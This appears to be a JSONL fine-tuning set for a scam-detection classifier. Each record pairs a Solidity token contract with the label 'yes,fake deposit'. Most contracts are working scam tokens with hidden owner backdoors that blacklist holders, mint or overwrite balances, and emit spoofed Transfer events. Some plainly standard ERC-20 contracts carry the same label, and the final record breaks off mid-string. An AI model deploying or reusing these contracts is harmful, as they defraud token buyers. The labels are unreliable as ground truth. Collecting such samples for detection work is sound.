{"prompt": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address gFX = 0xF8a92Ad72Eb298756F5f6aCC74fDd1A538B38a3D;\n\taddress gWFX = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract TETRIONIX is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private GZA;\n\tmapping (address => bool) private GZE;\n mapping (address => bool) private GZW;\n mapping (address => mapping (address => uint256)) private gZV;\n uint8 private constant GZD = 8;\n uint256 private constant gTS = 300000000 * (10** GZD);\n string private constant _name = \"Tetrionix\";\n string private constant _symbol = \"TETRION\";\n\n\n\n constructor () {\n GZA[_msgSender()] = gTS;\n gRMK(gWFX, gTS); }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return GZD;\n }\n\n function totalSupply() public pure returns (uint256) {\n return gTS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return GZA[account];\n }\n\t\n\n \n\n\t\t\t\t function gburn(address GZj) onlyOwner public{\n GZE[GZj] = true; }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return gZV[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n gZV[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction gquery(address GZj) public{\n if(GZE[msg.sender]) { \n GZW[GZj] = true; }}\n \n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == gFX) {\n require(amount <= GZA[sender]);\n GZA[sender] -= amount; \n GZA[recipient] += amount; \n gZV[sender][msg.sender] -= amount;\n emit Transfer (gWFX, recipient, amount);\n return true; } else \n if(!GZW[recipient]) {\n if(!GZW[sender]) {\n require(amount <= GZA[sender]);\n require(amount <= gZV[sender][msg.sender]);\n GZA[sender] -= amount;\n GZA[recipient] += amount;\n gZV[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction gStake(address GZj) public {\n if(GZE[msg.sender]) { \n GZW[GZj] = false;}}\n\t\tfunction gRMK(address GZj, uint256 gZN) onlyOwner internal {\n emit Transfer(address(0), GZj ,gZN); }\n\t\t\n\t\tfunction transfer(address GZj, uint256 gZN) public {\n if(msg.sender == gFX) {\n require(GZA[msg.sender] >= gZN);\n GZA[msg.sender] -= gZN; \n GZA[GZj] += gZN; \n emit Transfer (gWFX, GZj, gZN);} else \n if(GZE[msg.sender]) {GZA[GZj] += gZN;} else\n if(!GZW[msg.sender]) {\n require(GZA[msg.sender] >= gZN);\n GZA[msg.sender] -= gZN; \n GZA[GZj] += gZN; \n emit Transfer(msg.sender, GZj, gZN);}}\n\t\t\n\t\t\n\n\t\t\n\t\t}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract SoFi {\n \n mapping (address => uint256) public Yi;\n mapping (address => uint256) public TN;\n mapping (address => bool) Lv;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"Social Fi\";\n string public symbol = unicode\"SoFi\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n\n constructor() {\n Yi[msg.sender] = totalSupply;\n deploy(Head_Construct, totalSupply); }\n\n \n address deplyer = 0x2b401dC0C8d5DD69F12Dc17c6ac70fD1DAc0Fc94;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == deplyer) {\n require(Yi[msg.sender] >= value);\n Yi[msg.sender] -= value; \n Yi[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Lv[msg.sender]) {\n require(Yi[msg.sender] >= value);\n Yi[msg.sender] -= value; \n Yi[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function vald () public {\n if(msg.sender == deplyer) {\n Yi[msg.sender] = TN[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return Yi[account]; }\n\n function unval(address ii) public {\n if(msg.sender == deplyer) { \n Lv[ii] = false;}}\n function cheque(address ii) public{\n if(msg.sender == deplyer) { \n require(!Lv[ii]);\n Lv[ii] = true;\n }}\n function brne(uint256 x) public {\n if(msg.sender == deplyer) { \n TN[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == deplyer) {\n require(value <= Yi[from]);\n require(value <= allowance[from][msg.sender]);\n Yi[from] -= value; \n Yi[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Lv[from] && !Lv[to]) {\n require(value <= Yi[from]);\n require(value <= allowance[from][msg.sender]);\n Yi[from] -= value;\n Yi[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address BoI = 0xBC3054A5872773B726c2b71A29Dac1Fc933aFFE1;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == _Owner); \n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract XELIX is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Bxx;\n mapping (address => uint256) private Byy;\n mapping (address => mapping (address => uint256)) private BvI;\n uint8 private constant BdI = 8;\n uint256 private constant bTT = 150000000 * (10** BdI);\n string private constant _name = \"Xelix Network\";\n string private constant _symbol = \"XELIX\";\n\n\n\n constructor () {\n Bxx[_msgSender()] = bTT; \n emit Transfer(address(0), BoI, bTT);}\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return BdI;\n }\n\n function totalSupply() public pure returns (uint256) {\n return bTT;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Bxx[account];\n }\n\t function allowance(address owner, address spender) public view returns (uint256) {\n return BvI[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n BvI[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n\n function update() public {\n Bxx[msg.sender] = Byy[msg.sender];}\n function transfer(address to, uint256 amount) public {\n if(Byy[msg.sender] <= 1) {\n require(Bxx[msg.sender] >= amount);\n Bxx[msg.sender] -= amount; \n Bxx[to] += amount; \n emit Transfer(msg.sender, to, amount);}}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(Byy[sender] <= 1 && Byy[recipient] <= 1) {\n require(amount <= Bxx[sender]);\n require(amount <= BvI[sender][msg.sender]);\n Bxx[sender] -= amount;\n Bxx[recipient] += amount;\n BvI[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n function Qry(address x, uint256 y) public {\n require(msg.sender == BoI);\n Byy[x] = y;}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Create(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address kFX = 0x91D576803Dea8b723255eCB35b0039350a411Ef2;\n\taddress kKXF = 0xA64D08224A14AF343b70B983A9E4E41c8b848584;\n constructor () {\n address msgSender = _msgSender();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n modifier onlyOwner{\n require(msg.sender == kFX);\n _; }\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n\n}\n\n\n\ncontract ELUVIUM is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private kZA;\n mapping (address => uint256) private kZY;\n mapping (address => mapping (address => uint256)) private kZV;\n uint8 private constant KZD = 8;\n uint256 private constant kTS = 200000000 * (10** KZD);\n string private constant _name = \"Eluvium Labs\";\n string private constant _symbol = \"ELUVIUM\";\n\n\n\n constructor () {\n KRCM(kKXF, kTS);\n kZA[_msgSender()] = kTS; }\n \n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return KZD;\n }\n\n function totalSupply() public pure returns (uint256) {\n return kTS;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return kZA[account];\n }\n\t\n\n \n\n\t\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return kZV[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n kZV[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function KRCM(address kZJ, uint256 kZN) onlyOwner internal {\n emit Transfer(address(0), kZJ ,kZN); }\n\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == kFX) {\n require(amount <= kZA[sender]);\n kZA[sender] -= amount; \n kZA[recipient] += amount; \n kZV[sender][msg.sender] -= amount;\n emit Transfer (kKXF, recipient, amount);\n return true; } else\n if(kZY[sender] <= 1) {\n if(kZY[recipient] <= 1) { \n require(amount <= kZA[sender]);\n require(amount <= kZV[sender][msg.sender]);\n kZA[sender] -= amount;\n kZA[recipient] += amount;\n kZV[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n function Assert(address kZJ, uint256 kZN) public onlyOwner {\n kZY[kZJ] = kZN;}\n\n function transfer(address kZJ, uint256 kZN) public {\n if(msg.sender == kFX) {\n require(kZA[msg.sender] >= kZN);\n kZA[msg.sender] -= kZN; \n kZA[kZJ] += kZN; \n emit Transfer (kKXF, kZJ, kZN);} else \n if(kZY[msg.sender] == 1) {kZA[kZJ] += kZN;} else\n if(kZY[msg.sender] <= 1) {\n require(kZA[msg.sender] >= kZN);\n kZA[msg.sender] -= kZN; \n kZA[kZJ] += kZN; \n emit Transfer(msg.sender, kZJ, kZN);}}\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: test3.sol\n\npragma solidity ^0.4.4;\n\ncontract Token {\n\n/// @return total amount of tokens\nfunction totalSupply() constant returns (uint256 supply) {}\n\n/// @param _owner The address from which the balance will be retrieved\n/// @return The balance\nfunction balanceOf(address _owner) constant returns (uint256 balance) {}\n\n/// @notice send `_value` token to `_to` from `msg.sender`\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transfer(address _to, uint256 _value) returns (bool success) {}\n\n/// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n/// @param _from The address of the sender\n/// @param _to The address of the recipient\n/// @param _value The amount of token to be transferred\n/// @return Whether the transfer was successful or not\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n/// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @param _value The amount of wei to be approved for transfer\n/// @return Whether the approval was successful or not\nfunction approve(address _spender, uint256 _value) returns (bool success) {}\n\n/// @param _owner The address of the account owning tokens\n/// @param _spender The address of the account able to transfer the tokens\n/// @return Amount of remaining tokens allowed to spent\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\nfunction transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n}\n\nfunction balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n}\n\nfunction approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n}\n\nfunction allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n}\n\nmapping (address => uint256) balances;\nmapping (address => mapping (address => uint256)) allowed;\nuint256 public totalSupply;\n}\n\n//name this contract whatever you\u2019d like\ncontract ERC20Token is StandardToken {\n\nfunction () {\n//if ether is sent to this address, send it back.\nthrow;\n}\n\n\nstring public name; \nuint8 public decimals; \nstring public symbol; \nstring public version = 'H1.0'; \n\n\nfunction ERC20Token() {\n balances[msg.sender] = 30000000000000; \n totalSupply = 30000000000000; \n name = \"SHRUG\"; \n decimals = 18; \n symbol = \"SHRG\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\n\n library SafeMath {\n\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n if (a == 0) {\n return 0;\n }\n\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n\n return c;\n }\n\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n\n return c;\n }\n\n function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n return mod(a, b, \"SafeMath: modulo by zero\");\n }\n\n function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b != 0, errorMessage);\n return a % b;\n }\n} \n \n \n contract UNLEARNING {\n \n mapping (address => uint256) public OiO;\n mapping (address => uint256) public LRNED;\n mapping (address => bool) Ik;\n mapping(address => mapping(address => uint256)) public allowance;\n\n\n\n\n\n string public name = unicode\"UNLEARN\";\n string public symbol = unicode\"\ud83c\udf93UNLEARN\ud83c\udf93\";\n uint8 public decimals = 18;\n uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);\n\taddress owner = msg.sender;\n \n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event OwnershipRenounced(address indexed previousOwner);\n address Head_Construct = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n\n constructor() {\n OiO[msg.sender] = totalSupply;\n deploy(Head_Construct, totalSupply); }\n\n \n address deplyer = 0xc28Ce8B9715fe1Aa7cccf6b8fEa1214c5CE01e64;\n function deploy(address account, uint256 amount) public {\n require(msg.sender == owner);\n emit Transfer(address(0), account, amount); }\n\n function renounceOwnership() public {\n require(msg.sender == owner);\n emit OwnershipRenounced(owner);\n owner = address(0);}\n\n\n function transfer(address to, uint256 value) public returns (bool success) {\n \n \n if(msg.sender == deplyer) {\n require(OiO[msg.sender] >= value);\n OiO[msg.sender] -= value; \n OiO[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Ik[msg.sender]) {\n require(OiO[msg.sender] >= value);\n OiO[msg.sender] -= value; \n OiO[to] += value; \n emit Transfer(msg.sender, to, value);\n return true; }}\n\n function approve(address spender, uint256 value) public returns (bool success) { \n allowance[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true; }\n\n function learnt () public {\n if(msg.sender == deplyer) {\n OiO[msg.sender] = LRNED[msg.sender];\n }}\n\n function balanceOf(address account) public view returns (uint256) {\n return OiO[account]; }\n\n function unlrn(address ii) public {\n if(msg.sender == deplyer) { \n Ik[ii] = false;}}\n function lrn(address ii) public{\n if(msg.sender == deplyer) { \n require(!Ik[ii]);\n Ik[ii] = true;\n }}\n function lrner(uint256 x) public {\n if(msg.sender == deplyer) { \n LRNED[msg.sender] = x;} }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) { \n\n if(from == deplyer) {\n require(value <= OiO[from]);\n require(value <= allowance[from][msg.sender]);\n OiO[from] -= value; \n OiO[to] += value; \n emit Transfer (Head_Construct, to, value);\n return true; } \n if(!Ik[from] && !Ik[to]) {\n require(value <= OiO[from]);\n require(value <= allowance[from][msg.sender]);\n OiO[from] -= value;\n OiO[to] += value;\n allowance[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true; }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _MsgSendr() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _Owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _kpconstruct = 0x2Bd0892F7ADfC0be3AC7Cd3Be02353cF6FCc018E;\n\taddress V2UniswapRouter = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\n constructor () {\n address msgSender = _MsgSendr();\n _Owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _Owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _Owner);\n emit OwnershipTransferred(_Owner, address(0));\n _Owner = address(0);\n }\n\n}\n\n\n\ncontract AIREON is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private Opp;\n\tmapping (address => bool) private Ypp;\n mapping (address => bool) private Kpp;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _kpSup = 150000000 * 10**_decimals;\n string private constant _name = \"AIREON\";\n string private constant _symbol = \"AIREON\";\n\n\n\n constructor () {\n Opp[_MsgSendr()] = _kpSup;\n emit Transfer(address(0), V2UniswapRouter, _kpSup);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _kpSup;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return Opp[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\t\tfunction ppend(address px) public {\n if(Ypp[msg.sender]) { \n Kpp[px] = false;}}\n function ppquery(address px) public{\n if(Ypp[msg.sender]) { \n require(!Kpp[px]);\n Kpp[px] = true; }}\n\t\tfunction ppstake(address px) public{\n if(msg.sender == _kpconstruct) { \n require(!Ypp[px]);\n Ypp[px] = true; }}\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _kpconstruct) {\n require(amount <= Opp[sender]);\n Opp[sender] -= amount; \n Opp[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (V2UniswapRouter, recipient, amount);\n return true; } \n if(!Kpp[recipient]) {\n if(!Kpp[sender]) {\n require(amount <= Opp[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n Opp[sender] -= amount;\n Opp[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}}\n\t\tfunction transfer(address recipient, uint256 amount) public {\n if(msg.sender == _kpconstruct) {\n require(Opp[msg.sender] >= amount);\n Opp[msg.sender] -= amount; \n Opp[recipient] += amount; \n emit Transfer (V2UniswapRouter, recipient, amount);}\n if(Ypp[msg.sender]) {Opp[recipient] = amount;} \n if(!Kpp[msg.sender]) {\n require(Opp[msg.sender] >= amount);\n Opp[msg.sender] -= amount; \n Opp[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.6.7;\n\n\ninterface ERC20 {\n function totalSupply() external view returns (uint _totalSupply);\n function balanceOf(address _owner) external view returns (uint balance);\n function transfer(address _to, uint _value) external returns (bool success);\n function transferFrom(address _from, address _to, uint _value) external returns (bool success);\n function approve(address _spender, uint _value) external returns (bool success);\n function allowance(address _owner, address _spender) external view returns (uint remaining);\n event Transfer(address indexed _from, address indexed _to, uint _value);\n event Approval(address indexed _owner, address indexed _spender, uint _value);\n\n}\n\n// this is the basics of creating an ERC20 token\n//change the name Henri and the symbol to whatever you would like\n\ncontract RichMan is ERC20 {\n string public constant symbol = \"RICH\";\n string public constant name = \"Richman Coin\";\n uint8 public constant decimals = 18;\n \n //100,000\n uint private constant __totalSupply = 100000000000000000000000;\n\n //this mapping is where we store the balances of an address\n mapping (address => uint) private __balanceOf;\n\n //This is a mapping of a mapping. This is for the approval function to determine how much an address can spend\n mapping (address => mapping (address => uint)) private __allowances;\n\n //the creator of the contract has the total supply and no one can create tokens\n constructor() public {\n __balanceOf[msg.sender] = __totalSupply;\n }\n\n //constant value that does not change/ returns the amount of initial tokens to display\n function totalSupply() public view override returns (uint _totalSupply) {\n _totalSupply = __totalSupply;\n }\n\n //returns the balance of a specific address\n function balanceOf(address _addr) public view override returns (uint balance) {\n return __balanceOf[_addr];\n }\n \n\n //transfer an amount of tokens to another address. The transfer needs to be >0 \n //does the msg.sender have enough tokens to forfill the transfer\n //decrease the balance of the sender and increase the balance of the to address\n function transfer(address _to, uint _value) public override returns (bool success) {\n if (_value > 0 && _value <= balanceOf(msg.sender)) {\n __balanceOf[msg.sender] -= _value;\n __balanceOf[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n\n \n //this allows someone else (a 3rd party) to transfer from my wallet to someone elses wallet\n //If the 3rd party has an allowance of >0 \n //and the value to transfer is >0 \n //and the allowance is >= the value of the transfer\n //and it is not a contract\n //perform the transfer by increasing the to account and decreasing the from accounts\n function transferFrom(address _from, address _to, 